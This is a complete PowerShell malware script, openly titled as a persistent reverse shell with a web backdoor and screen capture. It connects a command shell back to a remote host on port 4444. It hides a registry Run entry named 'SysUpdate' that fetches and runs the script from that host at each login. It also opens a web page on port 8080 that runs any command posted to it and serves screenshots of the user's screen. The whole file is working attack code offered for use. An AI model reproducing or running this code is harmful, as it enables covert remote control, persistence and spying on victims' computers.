# shell.ps1 v3 - Persistent Reverse Shell + Web Backdoor + Screen Capture
$a = "System.Net.Sockets."; $b = "TCPClient"; $c = New-Object ($a + $b)("192.168.11.67", 4444); $s = $c.GetStream(); [byte[]]$b_arr = 0..65535|%{0}; $m = ([text.encoding]::ASCII).GetBytes("CONNECTED`nPS " + (pwd).Path + "> "); $s.Write($m,0,$m.Length);

# Persistence (download & execute on login)
$regcmd = 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(`"http://192.168.11.67/shell.ps1`")"';
New-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Force -ErrorAction SilentlyContinue | Out-Null;
Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SysUpdate' -Value $regcmd -Force -ErrorAction SilentlyContinue;

# Start PERSISTENT HTTP WEB SHELL (runs in SAME process, port 8080)
$httpjob = Start-Job -ScriptBlock {
    $listener = New-Object System.Net.HttpListener
    $listener.Prefixes.Add('http://*:8080/')
    $listener.Start()
    $html = '<h1>Web Shell Active</h1><form method=POST><textarea name=cmd rows=20 cols=100></textarea><br><input type=submit value="Execute"></form><hr>'
    
    while ($listener.IsListening) {
        $context = $listener.GetContext()
        $request = $context.Request
        $response = $context.Response
        
        if ($request.HttpMethod -eq 'POST' -and $request.Url.AbsolutePath -eq '/') {
            $cmd = $request.Form['cmd']
            $output = try { Invoke-Expression $cmd 2>&1 | Out-String } catch { $_.Exception.Message }
            $html = $html + "<pre>$cmd`n$output</pre><hr>"
        }
        elseif ($request.Url.AbsolutePath -eq '/screen') {
            Add-Type -AssemblyName System.Drawing
            Add-Type -AssemblyName System.Windows.Forms
            $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
            $stream = New-Object IO.MemoryStream
            $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
            $response.ContentType = 'image/jpeg'
            $response.ContentLength64 = $stream.Length
            $stream.WriteTo($response.OutputStream)
            $stream.Close()
        }
        else {
            $response.ContentType = 'text/html'
            $bytes = [Text.Encoding]::UTF8.GetBytes($html)
            $response.ContentLength64 = $bytes.Length
            $response.OutputStream.Write($bytes, 0, $bytes.Length)
        }
        $response.Close()
    }
    $listener.Stop()
}

# Main reverse shell loop (web server runs in parallel background job)
while(($i = $s.Read($b_arr, 0, $b_arr.Length)) -ne 0){
    $d = [text.encoding]::ASCII.GetString($b_arr,0, $i); 
    try { $sb = (Invoke-Expression $d 2>&1 | Out-String) } catch { $sb = $_.Exception.Message }; 
    $out = $sb + "PS " + (pwd).Path + "> "; 
    $m = ([text.encoding]::ASCII).GetBytes($out); 
    $s.Write($m,0,$m.Length); 
    $s.Flush()
}

# Cleanup on exit
$c.Close(); Stop-Job $httpjob; Remove-Job $httpjob
